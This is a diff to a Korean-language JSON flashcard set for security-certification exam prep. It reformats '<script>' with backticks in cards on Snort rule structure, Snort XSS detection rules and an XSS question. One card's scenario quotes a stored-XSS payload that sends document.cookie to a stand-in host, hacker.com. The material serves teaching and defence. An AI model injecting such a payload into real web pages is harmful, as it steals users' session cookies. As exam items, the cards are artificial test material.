@@ -266,7 +266,7 @@
       "category": "네트워크 보안",
       "subcategory": "Snort",
       "front": "Snort 룰의 기본 구조(헤더 + 옵션)를 설명하시오.",
-      "back": "**Snort 룰 구조**: `[규칙 헤더] (규칙 옵션)`\n\n**예시**:\n```\nalert tcp $EXTERNAL_NET any -> $HTTP_SERVERS 80\n(msg:\"XSS Attempt\"; content:\"<script>\"; nocase; sid:10001; rev:1;)\n```\n\n**규칙 헤더**: `액션 프로토콜 출발지IP 출발지포트 방향 목적지IP 목적지포트`\n- 방향: `->` (단방향), `<>` (양방향)\n\n**규칙 옵션**: `(msg; content; nocase; sid; rev; ...)`",
+      "back": "**Snort 룰 구조**: `[규칙 헤더] (규칙 옵션)`\n\n**예시**:\n```\nalert tcp $EXTERNAL_NET any -> $HTTP_SERVERS 80\n(msg:\"XSS Attempt\"; content:\"`<script>`\"; nocase; sid:10001; rev:1;)\n```\n\n**규칙 헤더**: `액션 프로토콜 출발지IP 출발지포트 방향 목적지IP 목적지포트`\n- 방향: `->` (단방향), `<>` (양방향)\n\n**규칙 옵션**: `(msg; content; nocase; sid; rev; ...)`",
       "type": "서술형",
       "frequency": "최빈출"
     },
@@ -562,7 +562,7 @@
       "id": 63,
       "category": "네트워크 보안",
       "subcategory": "Snort",
-      "front": "Snort 룰 예시를 해석하시오: alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS 80 (msg:\"XSS Attempt\"; content:\"<script>\"; nocase; sid:10001; rev:1;)",
+      "front": "Snort 룰 예시를 해석하시오: alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS 80 (msg:\"XSS Attempt\"; content:\"`<script>`\"; nocase; sid:10001; rev:1;)",
       "back": "**헤더 해석**:\n- `alert`: 조건 매칭 시 로그 + 알람 발생\n- `tcp`: L4 프로토콜 = TCP\n- `$EXTERNAL_NET any`: 출발지 = 외부 네트워크, 모든 포트\n- `->`: 단방향 (외부→내부)\n- `$HTTP_SERVERS 80`: 목적지 = 내부 HTTP 서버, 포트 80\n\n**옵션 해석**:\n- `msg:\"XSS Attempt\"`: 알람 발생 시 표시 메시지\n- `content:\"<script>\"`: 페이로드에서 `<script>` 문자열 검색\n- `nocase`: 대소문자 무시 (`<SCRIPT>`, `<Script>` 등 탐지)\n- `sid:10001`: 이 룰의 고유 ID\n- `rev:1`: 룰 버전 1",
       "type": "서술형",
       "frequency": "최빈출"
@@ -1210,8 +1210,8 @@
       "category": "네트워크 보안",
       "subcategory": "Snort 룰 분석 1",
       "type": "서술형",
-      "front": "[Snort 룰 분석 1]\n\n**상황:** alert tcp any any -> 192.168.1.10 80 (msg:\"XSS\"; content:\"<script>\";)\n\n**문제:** 위 룰에서 content 옵션의 역할(기능)을 서술하시오.",
-      "back": "패킷의 페이로드(데이터) 내에 <script> 라는 특정 문자열이 포함되어 있는지 검사한다.",
+      "front": "[Snort 룰 분석 1]\n\n**상황:** alert tcp any any -> 192.168.1.10 80 (msg:\"XSS\"; content:\"`<script>`\";)\n\n**문제:** 위 룰에서 content 옵션의 역할(기능)을 서술하시오.",
+      "back": "패킷의 페이로드(데이터) 내에 `<script>` 라는 특정 문자열이 포함되어 있는지 검사한다.",
       "id": 135,
       "frequency": "최빈출"
     },
@@ -1318,7 +1318,7 @@
       "category": "웹/애플리케이션 보안",
       "subcategory": "웹 공격 - XSS",
       "type": "단답형",
-      "front": "[웹 공격 - XSS]\n\n**상황:** 공격자가 게시판 제목에 <script>location.href='http://hacker.com/cookie?c='+document.cookie</script> 를 삽입하여 관리자의 세션 쿠키를 탈취했다.\n\n**문제:** 이 공격 기법의 명칭(세부 유형 포함)을 쓰시오.",
+      "front": "[웹 공격 - XSS]\n\n**상황:** 공격자가 게시판 제목에 `<script>`location.href='http://hacker.com/cookie?c='+document.cookie`</script>` 를 삽입하여 관리자의 세션 쿠키를 탈취했다.\n\n**문제:** 이 공격 기법의 명칭(세부 유형 포함)을 쓰시오.",
       "back": "저장형 XSS (Stored Cross-Site Scripting)",
       "id": 147,
       "frequency": "최빈출"
